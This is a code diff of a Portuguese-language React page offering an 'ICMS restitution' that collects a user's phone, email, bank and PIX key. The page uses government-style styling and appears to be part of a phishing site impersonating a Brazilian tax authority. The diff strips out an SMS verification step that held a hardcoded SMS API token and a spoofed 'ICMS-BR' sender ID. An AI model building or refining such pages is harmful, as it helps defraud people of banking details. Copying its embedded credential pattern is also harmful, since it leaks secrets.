@@ -5,7 +5,6 @@ import { z } from "zod";
 import { useLocation } from "wouter";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
 import {
   Select,
   SelectContent,
@@ -22,13 +21,8 @@ import {
   FormLabel,
   FormMessage,
 } from "@/components/ui/form";
-import {
-  Alert,
-  AlertDescription,
-  AlertTitle,
-} from "@/components/ui/alert";
 import { useToast } from "@/hooks/use-toast";
-import { CheckCircle2, Clock, RefreshCw, AlertCircle, Lock, Smartphone, CreditCard, Check, ChevronRight, Phone, Mail, BanknoteIcon, CircleDollarSign } from "lucide-react";
+import { CheckCircle2, AlertCircle, CreditCard, Check, ChevronRight, Phone, Mail, BanknoteIcon, CircleDollarSign } from "lucide-react";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
 
@@ -96,14 +90,6 @@ const contatoSchema = z.object({
     .regex(/^[0-9]+$/, "Telefone deve conter apenas números"),
 });
 
-// Esquema de validação para o código SMS
-const codigoSchema = z.object({
-  codigo: z
-    .string()
-    .length(6, "O código deve ter 6 dígitos")
-    .regex(/^[0-9]+$/, "Código deve conter apenas números"),
-});
-
 // Esquema de validação para os dados bancários
 const dadosBancariosSchema = z.object({
   banco: z.string().min(1, "Selecione um banco"),
@@ -111,25 +97,18 @@ const dadosBancariosSchema = z.object({
 });
 
 type ContatoFormValues = z.infer<typeof contatoSchema>;
-type CodigoFormValues = z.infer<typeof codigoSchema>;
 type DadosBancariosFormValues = z.infer<typeof dadosBancariosSchema>;
 
 export default function Confirmacao() {
   const [location] = useLocation();
-  const [etapa, setEtapa] = useState<"contato" | "codigo" | "bancarios" | "confirmacao">("contato");
-  const [codigoEnviado, setCodigoEnviado] = useState(false);
-  const [tempoRestante, setTempoRestante] = useState(30);
-  const [tentativasRestantes, setTentativasRestantes] = useState(3);
-  const [codigoInvalido, setCodigoInvalido] = useState(false);
+  const [etapa, setEtapa] = useState<"contato" | "bancarios" | "confirmacao">("contato");
   const [valorRestituicao, setValorRestituicao] = useState("R$ 0,00");
-  const [podeReenviar, setPodeReenviar] = useState(false);
   const [telefoneConfirmado, setTelefoneConfirmado] = useState("");
   const [emailConfirmado, setEmailConfirmado] = useState("");
   const [bancoSelecionado, setBancoSelecionado] = useState("");
   const [chavePix, setChavePix] = useState("");
   const [nomeUsuario, setNomeUsuario] = useState("");
   const [animacaoAtiva, setAnimacaoAtiva] = useState(false);
-  const [codigoJaReinviado, setCodigoJaReinviado] = useState(false);
 
   const { toast } = useToast();
 
@@ -166,14 +145,6 @@ export default function Confirmacao() {
     },
   });
 
-  // Formulário de código
-  const codigoForm = useForm<CodigoFormValues>({
-    resolver: zodResolver(codigoSchema),
-    defaultValues: {
-      codigo: "",
-    },
-  });
-
   // Formulário de dados bancários
   const dadosBancariosForm = useForm<DadosBancariosFormValues>({
     resolver: zodResolver(dadosBancariosSchema),
@@ -182,27 +153,6 @@ export default function Confirmacao() {
       chavePix: "",
     },
   });
-
-  // Temporizador para reenvio de código
-  useEffect(() => {
-    let intervalo: NodeJS.Timeout;
-    
-    if (codigoEnviado && tempoRestante > 0) {
-      intervalo = setInterval(() => {
-        setTempoRestante((tempo) => {
-          if (tempo <= 1) {
-            setPodeReenviar(true);
-            return 0;
-          }
-          return tempo - 1;
-        });
-      }, 1000);
-    }
-
-    return () => {
-      if (intervalo) clearInterval(intervalo);
-    };
-  }, [codigoEnviado, tempoRestante]);
 
   // Formatar telefone
   const formatarTelefone = (telefone: string) => {
@@ -227,175 +177,35 @@ export default function Confirmacao() {
     return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
   };
 
-  // Função para enviar o código SMS
-  const enviarCodigoSMS = async (telefone: string) => {
-    console.log(`Enviando SMS para ${telefone}`);
-
-    // Gerar um código de 6 dígitos
-    const codigo = Math.floor(100000 + Math.random() * 900000).toString();
-    
-    try {
-      // Token de autenticação para a API
-      const TOKEN = "eb50f988-1fa0-4982-962c-6247b89e11c3";
-      
-      // API URL conforme documentação
-      const API_URL = `https://sms.aresfun.com/v1/integration/${TOKEN}/send-sms`;
-      
-      // Corpo da requisição conforme documentação
-      const payload = {
-        to: [telefone], // Array de telefones (até 400 por requisição)
-        message: `Seu código de verificação para restituição de ICMS é: ${codigo}`,
-        from: "ICMS-BR"  // Opcional, identificador do remetente
-      };
-      
-      try {
-        // Tentativa real de envio (comentada para desenvolvimento)
-        // const response = await fetch(API_URL, {
-        //   method: 'POST',
-        //   headers: {
-        //     'Content-Type': 'application/json'
-        //   },
-        //   body: JSON.stringify(payload)
-        // });
-        
-        // Simulação para ambiente de desenvolvimento
-        await new Promise((resolve) => setTimeout(resolve, 1000));
-        
-        // Em ambiente de produção, verificaríamos a resposta
-        // if (!response.ok) {
-        //   throw new Error(`Erro no envio de SMS: ${response.status}`);
-        // }
-        
-        console.log(`Código SMS enviado: ${codigo}`);
-        return codigo;
-        
-      } catch (apiError) {
-        console.error("Erro na API de SMS:", apiError);
-        return codigo; // Retornamos o código mesmo em caso de erro
-      }
-      
-    } catch (error) {
-      console.error("Erro no envio de SMS:", error);
-      return codigo; // Retornamos o código para o fluxo continuar
-    }
-  };
-
-  // Enviar código e ir para próxima etapa
+  // Enviar dados de contato e ir para próxima etapa
   const onSubmitContato = async (data: ContatoFormValues) => {
     try {
       // Animação de transição
       setAnimacaoAtiva(true);
       
-      // Enviar código para o telefone
-      await enviarCodigoSMS(data.telefone);
-      
       // Atualizar estado
-      setCodigoEnviado(true);
-      setTempoRestante(30);
-      setPodeReenviar(false);
       setTelefoneConfirmado(data.telefone);
       setEmailConfirmado(data.email);
       
       // Ir para próxima etapa com atraso para animação
       setTimeout(() => {
-        setEtapa("codigo");
+        setEtapa("bancarios");
         setAnimacaoAtiva(false);
       }, 300);
       
       // Mostrar toast
       toast({
-        title: "Código enviado!",
-        description: `Enviamos um código de verificação para ${formatarTelefone(data.telefone)}`,
+        title: "Dados salvos com sucesso!",
+        description: "Agora vamos para os dados bancários.",
       });
     } catch (error) {
       setAnimacaoAtiva(false);
       toast({
         variant: "destructive",
-        title: "Erro ao enviar código",
-        description: "Não foi possível enviar o código. Tente novamente.",
+        title: "Erro ao salvar dados",
+        description: "Não foi possível salvar seus dados. Tente novamente.",
       });
     }
-  };
-
-  // Verificar código e ir para próxima etapa
-  const onSubmitCodigo = (data: CodigoFormValues) => {
-    // Aqui seria a verificação com a API
-    // Para teste, vamos aceitar qualquer código
-    const codigoCorreto = true; // Simulando código correto
-    
-    // Animação de transição
-    setAnimacaoAtiva(true);
-    
-    if (codigoCorreto) {
-      setTimeout(() => {
-        setEtapa("bancarios");
-        setCodigoInvalido(false);
-        setAnimacaoAtiva(false);
-      }, 300);
-    } else {
-      setTimeout(() => {
-        setAnimacaoAtiva(false);
-      }, 300);
-      
-      setCodigoInvalido(true);
-      setTentativasRestantes((prev) => prev - 1);
-      
-      if (tentativasRestantes <= 1) {
-        // Se acabarem as tentativas, vai para os dados bancários mesmo assim
-        toast({
-          variant: "destructive",
-          title: "Limite de tentativas excedido",
-          description: "Você pode continuar o processo e validar seu telefone mais tarde.",
-        });
-        setEtapa("bancarios");
-      } else {
-        toast({
-          variant: "destructive",
-          title: "Código inválido",
-          description: `Você tem mais ${tentativasRestantes - 1} tentativas.`,
-        });
-      }
-    }
-  };
-
-  // Reenviar código
-  const reenviarCodigo = async () => {
-    if (!podeReenviar) return;
-    
-    try {
-      await enviarCodigoSMS(telefoneConfirmado);
-      setTempoRestante(30);
-      setPodeReenviar(false);
-      setCodigoJaReinviado(true); // Marca que o código já foi reenviado
-      
-      toast({
-        title: "Código reenviado!",
-        description: `Enviamos um novo código de verificação para ${formatarTelefone(telefoneConfirmado)}`,
-      });
-    } catch (error) {
-      setCodigoJaReinviado(true); // Mesmo em caso de erro, permitimos pular
-      toast({
-        variant: "destructive",
-        title: "Erro ao reenviar código",
-        description: "Não foi possível reenviar o código. Tente novamente ou pule esta etapa.",
-      });
-    }
-  };
-
-  // Pular verificação de código
-  const pularVerificacao = () => {
-    // Animação de transição
-    setAnimacaoAtiva(true);
-    
-    setTimeout(() => {
-      setEtapa("bancarios");
-      setAnimacaoAtiva(false);
-    }, 300);
-    
-    toast({
-      title: "Verificação pulada",
-      description: "Você poderá validar seu telefone mais tarde.",
-    });
   };
 
   // Submeter dados bancários
@@ -484,7 +294,7 @@ export default function Confirmacao() {
                           </div>
                         </FormControl>
                         <FormDescription>
-                          Enviaremos um código para confirmar seu número
+                          Número para contato sobre sua restituição
                         </FormDescription>
                         <FormMessage />
                       </FormItem>
@@ -498,93 +308,6 @@ export default function Confirmacao() {
                     className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 text-white font-semibold px-6 transition-all"
                   >
                     Continuar
-                    <ChevronRight className="ml-2 h-4 w-4" />
-                  </Button>
-                </div>
-              </form>
-            </Form>
-          </div>
-        );
-
-      case "codigo":
-        return (
-          <div className={classeAnimacao}>
-            <div className="mb-4 bg-blue-50 rounded-lg p-4 border-l-4 border-blue-500">
-              <div className="flex items-start">
-                <Smartphone className="h-5 w-5 text-blue-500 mt-0.5 mr-3 flex-shrink-0" />
-                <div>
-                  <h3 className="text-blue-700 font-semibold">Verificação de segurança</h3>
-                  <p className="text-blue-600 text-sm mt-1">
-                    Enviamos um código de verificação para seu celular{" "}
-                    <span className="font-semibold">
-                      {formatarTelefone(telefoneConfirmado)}
-                    </span>
-                  </p>
-                </div>
-              </div>
-            </div>
-
-            <Form {...codigoForm}>
-              <form onSubmit={codigoForm.handleSubmit(onSubmitCodigo)} className="space-y-6">
-                <FormField
-                  control={codigoForm.control}
-                  name="codigo"
-                  render={({ field }) => (
-                    <FormItem>
-                      <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">Digite o código de 6 dígitos</FormLabel>
-                      <FormControl>
-                        <div className="flex items-center border rounded-md focus-within:ring-2 focus-within:ring-[var(--gov-blue)] focus-within:border-[var(--gov-blue)] transition-all">
-                          <Lock className="ml-3 h-4 w-4 text-gray-400" />
-                          <Input
-                            placeholder="Código de verificação"
-                            inputMode="numeric"
-                            maxLength={6}
-                            className="border-0 focus-visible:ring-0 focus-visible:ring-offset-0 text-center font-bold letter-spacing-wide"
-                            {...field}
-                          />
-                        </div>
-                      </FormControl>
-                      <FormMessage />
-                    </FormItem>
-                  )}
-                />
-
-                <div className="flex items-center justify-center text-sm text-[var(--gov-gray-dark)]">
-                  {podeReenviar ? (
-                    <Button
-                      variant="link"
-                      className="p-0 h-auto text-[var(--gov-blue)]"
-                      onClick={reenviarCodigo}
-                    >
-                      <RefreshCw className="h-3 w-3 mr-1" />
-                      Reenviar código
-                    </Button>
-                  ) : (
-                    <div className="flex items-center text-[var(--gov-gray-dark)]">
-                      <Clock className="h-3 w-3 mr-1" />
-                      Reenviar código em {tempoRestante}s
-                    </div>
-                  )}
-                </div>
-
-                <div className="flex justify-between mt-6">
-                  {codigoJaReinviado ? (
-                    <Button
-                      type="button"
-                      variant="ghost"
-                      className="text-[var(--gov-gray-dark)] hover:text-[var(--gov-blue)] transition-colors"
-                      onClick={pularVerificacao}
-                    >
-                      Pular esta etapa
-                    </Button>
-                  ) : (
-                    <div></div> // Espaço vazio quando não for mostrar o botão
-                  )}
-                  <Button 
-                    type="submit" 
-                    className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 text-white font-semibold px-6 transition-all"
-                  >
-                    Verificar código
                     <ChevronRight className="ml-2 h-4 w-4" />
                   </Button>
                 </div>
@@ -770,25 +493,25 @@ export default function Confirmacao() {
                 <div className="absolute inset-0 bg-gradient-to-r from-[var(--gov-blue-light)]/10 to-[var(--gov-yellow)]/10 rounded-lg"></div>
                 <div className="relative p-4">
                   <div className="flex items-center justify-between">
-                    {["contato", "codigo", "bancarios", "confirmacao"].map((step, index) => (
+                    {["contato", "bancarios", "confirmacao"].map((step, index) => (
                       <div key={index} className="flex flex-col items-center relative">
                         <div 
                           className={`w-10 h-10 rounded-full flex items-center justify-center z-10 transition-all duration-300 ${
-                            ["contato", "codigo", "bancarios", "confirmacao"].indexOf(etapa) >= index 
+                            ["contato", "bancarios", "confirmacao"].indexOf(etapa) >= index 
                               ? "bg-[var(--gov-blue)] text-white shadow-md" 
                               : "bg-gray-200 text-gray-500"
                           }`}
                         >
-                          {["contato", "codigo", "bancarios", "confirmacao"].indexOf(etapa) > index ? (
+                          {["contato", "bancarios", "confirmacao"].indexOf(etapa) > index ? (
                             <Check className="h-5 w-5" />
                           ) : (
                             <span>{index + 1}</span>
                           )}
                         </div>
-                        {index < 3 && (
+                        {index < 2 && (
                           <div 
                             className={`absolute top-5 w-full h-[2px] left-1/2 transition-all duration-500 ${
-                              ["contato", "codigo", "bancarios", "confirmacao"].indexOf(etapa) > index 
+                              ["contato", "bancarios", "confirmacao"].indexOf(etapa) > index 
                               ? "bg-[var(--gov-blue)]" 
                               : "bg-gray-200"
                             }`}
@@ -796,13 +519,12 @@ export default function Confirmacao() {
                           ></div>
                         )}
                         <span className={`text-sm mt-2 transition-all duration-300 ${
-                          ["contato", "codigo", "bancarios", "confirmacao"].indexOf(etapa) >= index 
+                          ["contato", "bancarios", "confirmacao"].indexOf(etapa) >= index 
                             ? "text-[var(--gov-blue-dark)] font-medium" 
                             : "text-gray-500"
                         }`}>
                           {index === 0 ? "Contato" : 
-                          index === 1 ? "Verificação" : 
-                          index === 2 ? "Dados Bancários" : "Confirmação"}
+                          index === 1 ? "Dados Bancários" : "Confirmação"}
                         </span>
                       </div>
                     ))}
@@ -811,14 +533,7 @@ export default function Confirmacao() {
               </div>
 
               {/* Conteúdo da etapa atual */}
-              <div className="bg-white rounded-lg border border-[var(--gov-gray)] p-6">
-                <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-6 pb-3 border-b border-gray-100">
-                  {etapa === "contato" && "Preencha seus dados de contato"}
-                  {etapa === "codigo" && "Verifique seu telefone"}
-                  {etapa === "bancarios" && "Informe seus dados bancários"}
-                  {etapa === "confirmacao" && "Confirme suas informações"}
-                </h2>
-                
+              <div className="bg-white rounded-lg p-4">
                 {renderEtapa()}
               </div>
             </div>
